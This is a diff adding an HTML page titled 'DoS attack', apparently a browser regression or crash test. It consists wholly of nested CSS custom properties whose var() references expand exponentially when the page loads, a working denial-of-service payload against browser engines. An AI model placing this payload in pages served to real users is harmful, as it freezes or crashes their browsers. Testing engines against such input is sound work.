@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>DoS attack</title>
+<style type="text/css">
+body {
+  --bla0: lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol lol;
+  --bla1: var(--bla0) var(--bla0) var(--bla0) var(--bla0) var(--bla0) var(--bla0) var(--bla0);
+  --bla2: var(--bla1) var(--bla1) var(--bla1) var(--bla1) var(--bla1) var(--bla1) var(--bla1);
+  --bla3: var(--bla2) var(--bla2) var(--bla2) var(--bla2) var(--bla2) var(--bla2) var(--bla2);
+  --bla4: var(--bla3) var(--bla3) var(--bla3) var(--bla3) var(--bla3) var(--bla3) var(--bla3);
+  --bla5: var(--bla4) var(--bla4) var(--bla4) var(--bla4) var(--bla4) var(--bla4) var(--bla4);
+  --bla6: var(--bla5) var(--bla5) var(--bla5) var(--bla5) var(--bla5) var(--bla5) var(--bla5);
+  --bla7: var(--bla6) var(--bla6) var(--bla6) var(--bla6) var(--bla6) var(--bla6) var(--bla6);
+  --bla8: var(--bla7) var(--bla7) var(--bla7) var(--bla7) var(--bla7) var(--bla7) var(--bla7);
+  --bla9: var(--nonexistent13,var(--bla8)) var(--bla8) var(--bla8) var(--bla8) var(--bla8) var(--bla8) var(--bla8);
+  --bla10: var(--nonexistent12,var(--bla9)) var(--bla9) var(--bla9) var(--bla9) var(--bla9) var(--bla9) var(--bla9);
+  --bla11: var(--nonexistent11,var(--bla10)) var(--bla10) var(--bla10) var(--bla10) var(--bla10) var(--bla10) var(--bla10);
+  --bla12: var(--nonexistent10,var(--bla11)) var(--bla11) var(--bla11) var(--bla11) var(--bla11) var(--bla11) var(--bla11);
+  --bla13: var(--nonexistent9,var(--bla12)) var(--bla12) var(--bla12) var(--bla12) var(--bla12) var(--bla12) var(--bla12);
+  --bla14: var(--nonexistent8,var(--bla13)) var(--bla13) var(--bla13) var(--bla13) var(--bla13) var(--bla13) var(--bla13);
+  --bla15: var(--nonexistent7,var(--bla14)) var(--bla14) var(--bla14) var(--bla14) var(--bla14) var(--bla14) var(--bla14);
+  --bla16: var(--nonexistent6,var(--bla15)) var(--nonexistent6,var(--bla15)) var(--bla15) var(--bla15) var(--bla15) var(--bla15) var(--bla15);
+  --bla17: var(--nonexistent5,var(--bla16)) var(--nonexistent5,var(--bla16)) var(--bla16) var(--bla16) var(--bla16) var(--bla16) var(--bla16);
+  --bla18: var(--nonexistent3,var(--nonexistent4,var(--bla17))) var(--nonexistent3,var(--bla17)) var(--nonexistent3,var(--bla17)) var(--bla17) var(--bla17) var(--bla17) var(--bla17);
+  --bla19: var(--nonexistent2,var(--nonexistent2,var(--bla18))) var(--nonexistent2,var(--bla18)) var(--nonexistent2,var(--bla18)) var(--nonexistent2,var(--bla18)) var(--nonexistent2,var(--bla18)) var(--nonexistent2,var(--bla18)) var(--nonexistent2,var(--bla18));
+  --bla:  var(--nonexistent1,var(--bla19)) var(--nonexistent1,var(--bla19)) var(--nonexistent1,var(--bla19)) var(--nonexistent1,var(--bla19)) var(--nonexistent1,var(--bla19)) var(--nonexistent1,var(--bla19)) var(--nonexistent1,var(--bla19));
+}
+div {
+  margin-left: var(--nonexistent,var(--bla)) var(--nonexistent,var(--bla)) var(--nonexistent,var(--bla)) var(--nonexistent,var(--bla)) var(--nonexistent,var(--bla)) var(--nonexistent,var(--bla)) var(--nonexistent,var(--bla));
+}
+</style>
+</head>
+<body>
+<div id ="div1">
+</div>
+</body>
+</html>
